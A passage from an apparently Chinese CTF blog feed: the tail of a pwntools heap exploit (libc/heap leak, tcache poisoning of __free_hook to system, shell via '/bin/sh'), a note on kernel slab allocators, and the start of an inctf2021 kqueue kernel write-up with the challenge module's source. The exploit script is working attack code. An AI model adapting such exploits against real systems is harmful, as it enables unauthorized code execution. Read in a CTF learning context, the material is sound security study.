class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Length: 6\\n&quot;</span>)</span><br><span class=\"line\">libc = u64(r.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1e0ff0</span></span><br><span class=\"line\">malloc_hook = libc+<span class=\"number\">0x1e0b90</span></span><br><span class=\"line\">free_hook = <span class=\"number\">0x1e3e20</span>+libc</span><br><span class=\"line\">realloc = libc + <span class=\"number\">0x097b20</span></span><br><span class=\"line\">system = libc + <span class=\"number\">0x4fa60</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libc))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;free_hook : &quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;realloc : &quot;</span>,<span class=\"built_in\">hex</span>(realloc))</span><br><span class=\"line\"><span class=\"comment\">#now we need wo leak a chunk address</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content-Length: 5\\n&quot;</span>)</span><br><span class=\"line\">heap_addr1 = (u64(r.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))&lt;&lt;<span class=\"number\">12</span>)+<span class=\"number\">0x6d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr1 : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr1))</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr2 = heap_addr1+<span class=\"number\">0x70</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">payload = p64((heap_addr2&gt;&gt;<span class=\"number\">12</span>)^(free_hook-<span class=\"number\">0x10</span>))</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x60</span>,p64(one_gadget))</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>,p64(<span class=\"number\">0xaaaaaaaaaaaaaaaa</span>)+p64(<span class=\"number\">0xbbbbbbbbbbbbbbbb</span>)+p64(system))</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">free(3)</span></span><br><span class=\"line\"><span class=\"string\">show(3)</span></span><br><span class=\"line\"><span class=\"string\">r.recvuntil(&quot;Content-Length: 5\\n&quot;)</span></span><br><span class=\"line\"><span class=\"string\">heap_addr2 = (u64(r.recvuntil(b&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12)</span></span><br><span class=\"line\"><span class=\"string\">print(&quot;heap_addr2 : &quot;,hex(heap_addr2))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">in glibc 2.33 tcache,</span></span><br><span class=\"line\"><span class=\"string\">if we put a new chunk in tcachebin,</span></span><br><span class=\"line\"><span class=\"string\">chunk-&gt;fd = ((chunk_user)&gt;&gt;12)^(last_freed_tcachechunk in this bin)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/",
            "url": "http://example.com/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/",
            "title": "slab、slub、slob学习记录",
            "date_published": "2022-05-06T04:47:54.000Z",
            "content_html": "<h1 id=\"kernelpwn的进一步学习后\"><a class=\"markdownIt-Anchor\" href=\"#kernelpwn的进一步学习后\">#</a> kernelpwn 的进一步学习后，</h1>\n<h2 id=\"虽然很多东西原理与用户态相似但是终究还是区别很大尤其是在内存的管理在用户态的glibc使用pmalloc进行堆块的管理-但是在内核态我们申请的空间不在仅仅是局限在几十字节的数据而且进程对于空间的申请更加频繁我们需要一个高效简单的管理机制\"><a class=\"markdownIt-Anchor\" href=\"#虽然很多东西原理与用户态相似但是终究还是区别很大尤其是在内存的管理在用户态的glibc使用pmalloc进行堆块的管理-但是在内核态我们申请的空间不在仅仅是局限在几十字节的数据而且进程对于空间的申请更加频繁我们需要一个高效简单的管理机制\">#</a> 虽然很多东西原理与用户态相似，但是终究还是区别很大，尤其是在内存的管理，在用户态的 glibc 使用 pmalloc 进行堆块的管理。但是在内核态，我们申请的空间不在仅仅是局限在几十字节的数据，而且进程对于空间的申请更加频繁，我们需要一个高效简单的管理机制。</h2>\n<p>目前在内核的空间 主要使用的内存管理机制有 slab,slub,slob，其中 slab 是最早的管理机制，但是在 2.6 的 kernel 后被 slub 所代替。目前 slub 也是默认的管理器。而 slob 主要应用在轻量级和移动端的设备中。</p>\n<p>虽然 slab 被 slub 取代，但是二者是升级迭代的关系，slub 一定程度继承了 slab 的机制。上述三者统称为内存分配器。</p>\n<p>几个基本概念：</p>\n<p>1，对比于用户态的程序，与内核态的程序，关于内存的使用。以往我们写的简单程序并没有对物理内存进行主动更改，以堆题为例，我们我们使用的不过是程序分配给我们的虚拟空间，但这个空间真的不存在嘛？不，实际上很多时候我们分配的虚拟空间也好，知识系统的一块提供给我们的内存空间，这个空间是重复使用的，区别于储存空间，比如磁盘。我们使用的空间一般是操作系统的虚拟内存分配的</p>\n<p>32 位下的虚拟内存空间布局如下：</p>\n<p><img data-src=\"https://i.loli.net/2021/11/09/qLsr8xECYNpRbAI.png\" alt=\"image.png\"></p>\n<p>64 位下的虚拟内存空间布局如下：</p>\n<p><img data-src=\"https://i.loli.net/2021/11/09/k8NHa1ljMEfXQbh.png\" alt=\"img\"></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/03/inctf2021-kqueue/",
            "url": "http://example.com/2022/05/03/inctf2021-kqueue/",
            "title": "inctf2021_kqueue",
            "date_published": "2022-05-03T11:51:43.000Z",
            "content_html": "<h1 id=\"inctf2021-pwn-kqueueheap_overflow\"><a class=\"markdownIt-Anchor\" href=\"#inctf2021-pwn-kqueueheap_overflow\">#</a> Inctf2021 pwn kqueue\t\theap_overflow</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<p>首先这个文件系统解压出来重新打包会出现问题，因为按照上一篇博客所讲的，创建 file_system 文件夹后，把文件系统的包丢进去，一旦更改后缀名称就是导致归档失败，无法使用 gunzip 进行解包。手动提取后，使用 find 打包，会导致我们启动的时候，报错我们没有挂载的权限。所以我没有重新打包。</p>\n<p>提取出来的 vmlinux</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0xffffffff81000000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>文件系统加载了一个 mod，就是 kqueue</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue/file_system/root$ checksec --file=kqueue.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/file_system/root/kqueue.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>\n<p>之开启了 canary 以及 NX 保护，（这里的 NX 就不允许我们执行用户态代码）</p>\n<p>chall, 启动脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exec</span> qemu-system-x86_64 \\</span><br><span class=\"line\">    -cpu kvm64 \\</span><br><span class=\"line\">    -m 512 \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -kernel <span class=\"string\">&quot;bzImage&quot;</span> \\</span><br><span class=\"line\">    -append <span class=\"string\">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \\</span><br><span class=\"line\">    -monitor /dev/null \\</span><br><span class=\"line\">    -initrd <span class=\"string\">&quot;./rootfs.cpio&quot;</span> \\</span><br><span class=\"line\">    -net user \\</span><br><span class=\"line\">    -net nic</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>开启了 kaslr 地址随机化</p>\n<p>下面就是我们对题目的逆向</p>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<p>xlab&amp;slub 分配</p>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>题目加载了 kqueue 的模块，题目直接给出了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Generic header files */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/module.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/device.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/mutex.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/fs.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/slab.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/uaccess.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;kqueue.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC push_options</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC optimize (<span class=\"string\">&quot;O1&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">kqueue_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> cmd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">long</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">request_t</span> request;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mutex_lock(&amp;operations_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (copy_from_user((<span class=\"type\">void</span> *)&amp;request, (<span class=\"type\">void</span> *)arg, <span class=\"keyword\">sizeof</span>(<span class=\"type\">request_t</span>)))&#123;</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(cmd)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> CREATE_KQUEUE:</span><br><span class=\"line\">            result = create_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> DELETE_KQUEUE:</span><br><span class=\"line\">            result = delete_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> EDIT_KQUEUE:</span><br><span class=\"line\">            result = edit_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SAVE:</span><br><span class=\"line\">            result = save_kqueue_entries(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            result = INVALID;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">ret: </span><br><span class=\"line\">    mutex_unlock(&amp;operations_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">create_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> result = INVALID;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Asking for too much is also not good */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Initialize kqueue_entry structure */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class=\"line\">    ull space = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_umulll_overflow(<span class=\"keyword\">sizeof</span>(queue_entry),(request.max_entries+<span class=\"number\">1</span>),&amp;space) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class=\"line\">    ull queue_size = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_saddll_overflow(<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>),space,&amp;queue_size) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Total size should not exceed a certain limit */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queue_size&gt;<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>) + <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All checks done , now call kzalloc */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate((<span class=\"type\">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Main queue can also store data */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data = validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fill the remaining queue structure */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data_size   = request.data_size;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;queue_size  = queue_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the place from where memory has to be handled */</span></span><br><span class=\"line\">    kqueue_entry = (queue_entry *)((<span class=\"type\">uint64_t</span>)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate all kqueue entries */</span></span><br><span class=\"line\">    queue_entry* current_entry = kqueue_entry;</span><br><span class=\"line\">    queue_entry* prev_entry = current_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i!=request.max_entries)</span><br><span class=\"line\">            prev_entry-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        current_entry-&gt;idx = i;</span><br><span class=\"line\">        current_entry-&gt;data = (<span class=\"type\">char</span> *)(validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Increment current_entry by size of queue_entry */</span></span><br><span class=\"line\">        current_entry += <span class=\"keyword\">sizeof</span>(queue_entry)/<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Populate next pointer of the previous entry */</span></span><br><span class=\"line\">        prev_entry-&gt;next = current_entry;</span><br><span class=\"line\">        prev_entry = prev_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Find an appropriate slot in kqueues */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueues[j] == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class=\"line\">    kqueues[j] = <span class=\"built_in\">queue</span>;</span><br><span class=\"line\">    queueCount++;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">delete_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid idx&quot;</span>);</span><br><span 